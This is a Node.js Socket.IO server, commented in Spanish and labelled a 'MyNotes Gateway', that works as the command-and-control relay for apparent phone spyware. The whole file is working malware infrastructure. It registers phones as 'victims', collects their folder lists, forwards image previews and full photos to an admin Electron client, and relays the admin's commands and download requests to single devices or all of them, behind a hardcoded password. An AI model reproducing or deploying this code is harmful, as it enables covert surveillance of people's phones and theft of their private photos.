const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

const PORT = process.env.PORT || 3000;
const AUTH_PASS = "admin123"; // La misma contraseña que usabas

// Endpoint simple para verificar que el server vive
app.get('/', (req, res) => {
    res.send("MyNotes Gateway Online. Waiting for Electron Client...");
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" }, 
    maxHttpBufferSize: 1e8 
});

let victims = {}; // Lista de celulares
let adminSocket = null; // Tu PC con Electron

io.on('connection', (socket) => {
    
    // 1. IDENTIFICACIÓN (¿Eres el Admin o un Celular?)
    const authType = socket.handshake.auth.type;
    const authPass = socket.handshake.auth.token;

    if (authType === 'admin') {
        if (authPass === AUTH_PASS) {
            console.log(`[!] ADMIN CONECTADO (Electron): ${socket.id}`);
            adminSocket = socket;
            // Al conectar el admin, le enviamos la lista actual de víctimas
            socket.emit('update_device_list', victims);
        } else {
            console.log(`[!] Intento de admin fallido`);
            socket.disconnect();
            return;
        }
    } else {
        // Es un celular (o se asume)
        // No hacemos nada hasta que mande 'register_device'
    }

    // 2. RUTEO DE DATOS (CELULAR -> ADMIN)
    socket.on('usrData', (data) => {
        // A. Registro del dispositivo
        if (data.dataType === 'register_device') {
            victims[socket.id] = {
                name: data.deviceName,
                id: data.deviceId,
                socketId: socket.id
            };
            console.log(`[+] Celular: ${data.deviceName}`);
            // Avisar al Admin si está conectado
            if (adminSocket) adminSocket.emit('update_device_list', victims);
        }
        
        // B. Actualización de carpetas
        else if (data.dataType === 'folder_list') {
            if (victims[socket.id]) {
                victims[socket.id].folders = data.folders;
                if (adminSocket) adminSocket.emit('update_device_list', victims);
            }
        }

        // C. Previews e Imágenes HD (Reenviar al Admin)
        else if (data.dataType === 'preview_image' || data.dataType === 'full_image') {
            data.victimId = socket.id; // Asegurar que el admin sepa de quién es
            if (adminSocket) {
                // REENVIAR AL ELECTRON
                adminSocket.emit(data.dataType === 'preview_image' ? 'new_preview' : 'receive_full', data);
            }
        }
    });

    // 3. COMANDOS (ADMIN -> CELULAR)
    socket.on('admin_command', (cmd) => {
        // Solo aceptamos comandos si vienen del socket guardado como admin
        if (socket !== adminSocket) return;

        console.log(`[CMD] ${cmd.action} -> ${cmd.target}`);
        
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
        } else {
            io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
        }
    });

    // 4. SOLICITUD DE DESCARGA (ADMIN -> CELULAR)
    socket.on('order_download', (data) => {
        if (socket !== adminSocket) return;
        if(data.target) {
            io.to(data.target).emit('request_full_image', { path: data.path });
        }
    });

    // 5. DESCONEXIÓN
    socket.on('disconnect', () => {
        if (socket === adminSocket) {
            console.log("[!] Admin desconectado");
            adminSocket = null;
        } else if (victims[socket.id]) {
            console.log(`[-] Salió: ${victims[socket.id].name}`);
            delete victims[socket.id];
            if (adminSocket) adminSocket.emit('update_device_list', victims);
        }
    });
});

server.listen(PORT, () => console.log(`🚀 GATEWAY RUNNING ON PORT ${PORT}`));
